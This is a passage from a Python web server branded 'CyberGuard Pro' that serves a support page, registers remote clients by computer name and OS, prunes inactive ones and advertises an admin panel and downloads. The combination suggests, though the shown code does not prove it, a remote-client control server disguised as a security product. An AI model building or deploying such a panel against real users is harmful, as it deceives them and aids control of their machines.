                    <a href="/downloads">Downloads</a>
                </div>
            </nav>

            <h1>Customer Support</h1>
            <p>We're here to help you with any issues</p>
            
            <div class="support-grid">
                <div class="support-card">
                    <h3>📞 Contact Support</h3>
                    <p>Email: support@cyberguard-pro.com</p>
                    <p>Phone: +1-555-SECURITY</p>
                    <p>Live Chat: Available 24/7</p>
                </div>
                
                <div class="support-card">
                    <h3>📚 Documentation</h3>
                    <p>User Guides</p>
                    <p>Installation Manuals</p>
                    <p>Troubleshooting</p>
                    <p>FAQ</p>
                </div>
                
                <div class="support-card">
                    <h3>🔧 Technical Support</h3>
                    <p>Remote Assistance</p>
                    <p>System Diagnostics</p>
                    <p>Performance Optimization</p>
                    <p>Security Audits</p>
                </div>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(support_html.encode())

    def send_404_page(self):
        self.send_error(404, "Page not found")

    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def handle_client_register(self, data):
        with self.session_lock:
            client_id = data.get('client_id', str(uuid.uuid4())[:8])
            self.sessions[client_id] = {
                'id': client_id,
                'computer': data.get('computer', 'Unknown'),
                'os': data.get('os', 'Unknown'),
                'last_seen': datetime.now().isoformat(),
                'status': 'online'
            }
            print(f"🆕 New client registered: {client_id}")
            return {'success': True}

def cleanup_sessions():
    """تنظيف الجلسات غير النشطة"""
    while True:
        try:
            current_time = datetime.now()
            with ProfessionalSecurityHandler.session_lock:
                for client_id, client_data in list(ProfessionalSecurityHandler.sessions.items()):
                    last_seen = datetime.fromisoformat(client_data['last_seen'])
                    if (current_time - last_seen).total_seconds() > 300:
                        del ProfessionalSecurityHandler.sessions[client_id]
                        print(f"Cleaned up inactive client: {client_id}")
            time.sleep(60)
        except:
            pass

def main():
    handler = ProfessionalSecurityHandler
    handler.init_database(handler)
    
    # بدء تنظيف الجلسات في خيط منفصل
    threading.Thread(target=cleanup_sessions, daemon=True).start()
    
    port = int(os.environ.get('PORT', 8080))
    server = ThreadedHTTPServer(('0.0.0.0', port), handler)
    
    print("=" * 70)
    print("🚀 CYBERGUARD PRO - ENTERPRISE SECURITY PLATFORM")
    print("=" * 70)
    print(f"📍 Main Site: {handler.SERVER_URL}")
    print(f"🔐 Admin Panel: {handler.SERVER_URL}/admin")
    print(f"📥 Downloads: {handler.SERVER_URL}/downloads")
    print("💰 Products & Pricing: /products, /pricing")
    print("🆘 Support: /support")
    print("=" * 70)
    print("✅ Server started successfully!")
    print("🔒 Multi-platform protection system activated")
    print("=" * 70)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        if hasattr(handler, 'conn'):
            handler.conn.close()

if __name__ == "__main__":
    main()